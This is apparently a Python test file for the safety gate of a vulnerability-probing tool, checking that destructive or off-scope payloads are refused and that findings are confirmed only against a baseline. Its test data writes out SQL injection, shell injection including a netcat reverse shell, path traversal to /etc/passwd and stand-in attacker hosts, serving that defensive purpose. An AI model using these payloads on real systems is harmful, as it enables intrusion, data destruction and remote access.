"""Adaptive payload probes: the pure gate that decides what may be sent.

These tests pin the two properties that make the probe a validation tool rather
than a liability: nothing destructive/off-scope ever leaves, and a finding is
only confirmed when the oracle actually fires against a baseline.
"""
from app.exploit.payload_gen import (inject, is_destructive, marker,
                                     oracle_fired, smuggles_host, validate_probe)


class R:
    """Minimal stand-in for SafeResponse."""
    def __init__(self, status_code=200, text=""):
        self.status_code = status_code
        self.text = text


def in_scope(host):
    return host.endswith("example.com")


# ---- destructive denylist ----
def test_destructive_payloads_are_refused():
    for bad in ["1; DROP TABLE users--", "1 UNION SELECT 1 INTO OUTFILE '/tmp/x'",
                "'; DELETE FROM sessions--", "; rm -rf /", "a|sh", "; shutdown -h now",
                "$(nc -e /bin/sh 10.0.0.1 4444)", "x > /etc/passwd",
                "1; UPDATE users SET admin=1", "; cat /etc/passwd >> /tmp/out"]:
        assert is_destructive(bad), bad


def test_read_only_probe_payloads_are_allowed():
    for ok in ["1' AND '1'='1", "${7*7}", "{{7*7}}", "../../../../etc/passwd",
               "1 OR 1=1", "<svg onload=1>", "' UNION SELECT null,null--"]:
        assert not is_destructive(ok), ok


def test_shell_verbs_only_count_in_command_position():
    # '/etc/passwd' is THE read-only LFI oracle - refusing it would gut LFI
    # validation. The passwd COMMAND is still refused.
    assert not is_destructive("../../../../etc/passwd")
    assert not is_destructive("/proc/self/environ")
    assert is_destructive("; passwd root")
    assert is_destructive("`chown root x`")
    assert is_destructive("$(useradd hacker)")


def test_sleep_is_bounded_not_banned():
    assert not is_destructive("1' AND sleep(5)--")     # timing oracle, fine
    assert is_destructive("1' AND sleep(120)--")       # DoS, refused


# ---- scope smuggling ----
def test_payload_cannot_smuggle_offscope_host():
    assert smuggles_host("http://evil.tld/x", in_scope)
    assert smuggles_host("//attacker.io", in_scope)
    assert not smuggles_host("https://app.example.com/cb", in_scope)
    assert not smuggles_host("${7*7}", in_scope)


# ---- probe validation ----
def _probe(**kw):
    base = {"oracle": "math", "param": "id", "payload": "${7*7}", "expect": "49"}
    base.update(kw)
    return base


TARGET = "https://app.example.com/item?id=1"


def test_valid_probe_is_normalised():
    p = validate_probe(_probe(), TARGET, in_scope)
    assert p and p["oracle"] == "math" and p["param"] == "id"


def test_probe_rejected_on_unknown_oracle_or_missing_expect():
    assert validate_probe(_probe(oracle="vibes"), TARGET, in_scope) is None
    assert validate_probe(_probe(expect=""), TARGET, in_scope) is None


def test_differential_probe_requires_both_payloads():
    assert validate_probe(_probe(oracle="differential", expect="x"),
                          TARGET, in_scope) is None
    ok = validate_probe(_probe(oracle="differential", payload="1' AND '1'='1",
                               payload_false="1' AND '1'='2", expect="x"),
                        TARGET, in_scope)
    assert ok is not None


def test_probe_rejected_when_destructive_or_offscope():
    assert validate_probe(_probe(payload="1; DROP TABLE t--"), TARGET, in_scope) is None
    assert validate_probe(_probe(payload="http://evil.tld/x"), TARGET, in_scope) is None
    # target itself out of scope
    assert validate_probe(_probe(), "https://evil.tld/a?id=1", in_scope) is None


def test_probe_rejected_on_bad_param_or_oversized_payload():
    assert validate_probe(_probe(param="id; drop"), TARGET, in_scope) is None
    assert validate_probe(_probe(payload="A" * 500), TARGET, in_scope) is None


# ---- injection ----
def test_inject_replaces_and_adds_params():
    assert inject("https://t/a?id=1&x=2", "id", "9") == "https://t/a?id=9&x=2"
    assert "q=z" in inject("https://t/a", "q", "z")
    assert inject("not a url", "q", "z") is None


# ---- oracles: signal must be absent from the baseline ----
def test_math_oracle_needs_absence_in_baseline():
    base = R(text="hello 1")
    assert oracle_fired("math", baseline=base, positive=R(text="hello 49"), expect="49")
    # 49 already present in the baseline -> coincidence, not proof
    assert not oracle_fired("math", baseline=R(text="page 49"),
                            positive=R(text="page 49"), expect="49")


def test_differential_oracle_true_tracks_baseline_false_diverges():
    base = R(text="A" * 1000)
    same = R(text="A" * 1000)
    diff = R(text="B" * 200)
    assert oracle_fired("differential", baseline=base, positive=same, negative=diff)
    # both identical -> no boolean signal
    assert not oracle_fired("differential", baseline=base, positive=same, negative=same)
    # differential without a negative response cannot conclude
    assert not oracle_fired("differential", baseline=base, positive=same)


def test_status_flip_oracle():
    assert oracle_fired("status_flip", baseline=R(403), positive=R(200))
    assert not oracle_fired("status_flip", baseline=R(200), positive=R(200))


def test_unknown_oracle_and_missing_response_never_confirm():
    assert not oracle_fired("magic", baseline=R(), positive=R())
    assert not oracle_fired("math", baseline=R(), positive=None, expect="49")
    assert not oracle_fired("math", baseline=None, positive=R(), expect="49")


def test_marker_is_unique_and_benign():
    a, b = marker(), marker()
    assert a != b and a.isalnum()
